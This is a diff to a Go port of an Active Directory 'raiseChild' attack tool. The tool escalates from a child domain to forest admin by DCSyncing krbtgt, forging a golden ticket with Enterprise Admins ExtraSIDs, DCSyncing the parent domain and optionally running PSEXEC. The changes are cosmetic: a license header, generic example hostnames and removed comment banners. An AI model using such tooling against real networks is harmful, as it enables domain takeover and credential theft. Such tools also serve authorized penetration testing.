@@ -1,3 +1,6 @@
+// SPDX-License-Identifier: Apache-2.0
+// Copyright 2026 Jacob Paullus
+
 package main
 
 import (
@@ -36,10 +39,10 @@ Positional arguments:
   target           [[domain/]username[:password]@]<childDC>
 
 Examples:
-  raiseChild 'child.liquorstore.local/administrator:Password123@172.30.19.227'
-  raiseChild 'child.liquorstore.local/administrator:Password123@172.30.19.227' -parent-dc 172.30.17.4
-  raiseChild 'child.liquorstore.local/administrator@172.30.19.227' -hashes :NTHASH
-  raiseChild 'child.liquorstore.local/administrator:Password123@172.30.19.227' -target-exec 172.30.17.4
+  raiseChild 'child.domain.local/administrator:Password123@child-dc.child.domain.local'
+  raiseChild 'child.domain.local/administrator:Password123@child-dc.child.domain.local' -parent-dc parent-dc.domain.local
+  raiseChild 'child.domain.local/administrator@child-dc.child.domain.local' -hashes :NTHASH
+  raiseChild 'child.domain.local/administrator:Password123@child-dc.child.domain.local' -target-exec parent-dc.domain.local
 `
 
 	opts := flags.Parse()
@@ -63,9 +66,7 @@ Examples:
 		target.Port = 445
 	}
 
-	// ============================================================
 	// Phase 1: Get child domain info via LSARPC + NTLM target info
-	// ============================================================
 	fmt.Printf("[*] Raising child domain %s\n", creds.Domain)
 
 	childDomainSID, forestFQDN, err := queryChildDomainInfo(target, &creds)
@@ -96,9 +97,7 @@ Examples:
 		fmt.Printf("[*] Discovered parent DC: %s\n", *parentDC)
 	}
 
-	// ============================================================
 	// Phase 2: Get parent domain info via LSARPC + resolve parent DC FQDN
-	// ============================================================
 	parentTarget := session.Target{Host: *parentDC, Port: 445}
 	parentDomainName, parentDomainSID, parentDCHostname, err := queryParentDomainInfo(parentTarget, &creds)
 	if err != nil {
@@ -120,9 +119,7 @@ Examples:
 		targetUsername = "Administrator"
 	}
 
-	// ============================================================
 	// Phase 3: DCSync child domain krbtgt
-	// ============================================================
 	fmt.Printf("[*] Getting credentials for child domain\n")
 
 	childNetbios := strings.ToUpper(strings.Split(creds.Domain, ".")[0])
@@ -146,9 +143,7 @@ Examples:
 		}
 	}
 
-	// ============================================================
 	// Phase 4: Forge golden ticket with ExtraSIDs
-	// ============================================================
 	fmt.Printf("[*] Forging inter-realm TGT\n")
 
 	// Enterprise Admins SID = parentSID-519
@@ -182,9 +177,7 @@ Examples:
 		ccacheFilename = *writeTkt
 	}
 
-	// ============================================================
 	// Phase 5: Cross-realm TGS-REQ
-	// ============================================================
 	parentRealm := strings.ToUpper(parentDomainFQDN)
 	crossRealmSPN := fmt.Sprintf("krbtgt/%s", parentRealm)
 
@@ -203,9 +196,7 @@ Examples:
 		log.Fatalf("[-] Cross-realm TGS-REQ failed: %v", err)
 	}
 
-	// ============================================================
 	// Phase 6: DCSync parent domain using Kerberos
-	// ============================================================
 
 	// Save multi-entry ccache with forged TGT + inter-realm TGT
 	now := time.Now().UTC()
@@ -277,9 +268,7 @@ Examples:
 
 	printDCSyncResult(parentNetbios, targetUsername, parentUser)
 
-	// ============================================================
 	// Optional: PSEXEC via -target-exec
-	// ============================================================
 	if *targetExec != "" {
 		parentNTHash := hex.EncodeToString(parentUser.NTHash)
 		execTargetStr := fmt.Sprintf("%s/%s@%s", parentDomainFQDN, targetUsername, *targetExec)
